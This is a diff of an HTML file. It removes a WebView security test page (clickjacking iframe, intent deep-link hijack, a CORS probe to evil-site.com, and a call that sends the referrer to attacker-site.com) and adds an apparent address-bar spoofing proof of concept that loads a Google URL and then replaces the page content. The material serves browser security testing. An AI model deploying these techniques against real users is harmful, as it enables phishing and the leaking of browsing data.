@@ -1,58 +1,14 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>WebView Security Tests</title>
-    <script>
-        window.onload = function() {
-            testClipboardWrite();
-        };
-
-        function testClipboardWrite() {
-            navigator.clipboard.writeText('Clipboard test data')
-                .then(() => alert('Clipboard write succeeded!'))
-                .catch(err => alert('Clipboard write blocked: ' + err));
-        }
-
-        function testClickjacking() {
-            let frame = document.createElement('iframe');
-            frame.style.position = 'absolute';
-            frame.style.opacity = '0.01';
-            frame.style.width = '100%';
-            frame.style.height = '100%';
-            frame.src = "https://malicious-site.com";
-            document.body.appendChild(frame);
-            setTimeout(() => alert('Clickjacking test: Hidden iframe added. If you see no visible changes, clickjacking might be possible.'), 2000);
-        }
-
-        function testDeepLinkHijack() {
-            alert('Testing deep link hijack. If your WebView does not block external intents, this may launch another app.');
-            window.location.href = "intent://malicious-app#Intent;scheme=https;package=com.android.chrome;end";
-        }
-
-        function testCORS() {
-            fetch('https://evil-site.com/api/data', { mode: 'no-cors' })
-                .then(res => alert('CORS test failed: Request went through! WebView may not be enforcing proper restrictions.'))
-                .catch(err => alert('CORS test passed: Blocked by policy - ' + err));
-        }
-
-        function testReferrerLeakage() {
-            let referrer = document.referrer || 'No referrer detected';
-            let img = new Image();
-            img.src = "https://attacker-site.com/log?referrer=" + encodeURIComponent(referrer);
-            document.body.appendChild(img);
-            if (referrer !== 'No referrer detected') {
-                alert('⚠️ Referrer Leak Detected! Referrer: ' + referrer + '\nThis indicates a possible vulnerability.');
-            } else {
-                alert('✅ No referrer leakage detected.');
-            }
-        }
-    </script>
-</head>
+  <head>
+    <title>lalala</title>
+  </head>
 <body>
-    <h2>WebView Security Tests</h2>
-    <button onclick="testClickjacking()">Test Clickjacking</button>
-    <button onclick="testDeepLinkHijack()">Test Deep Link Hijacking</button>
-    <button onclick="testCORS()">Test CORS Security</button>
-    <button onclick="testReferrerLeakage()">Test Referrer Leakage</button>
+  <script>
+    function spoof(){
+    location="https://www.google.com/csi?random="+Math.random();
+    document.body.innerHTML='This is not Google!';
+    }
+</script>
+<input type="button" value="Run" onclick="setInterval(spoof(),20);"/>
 </body>
-</html>
+</html> 
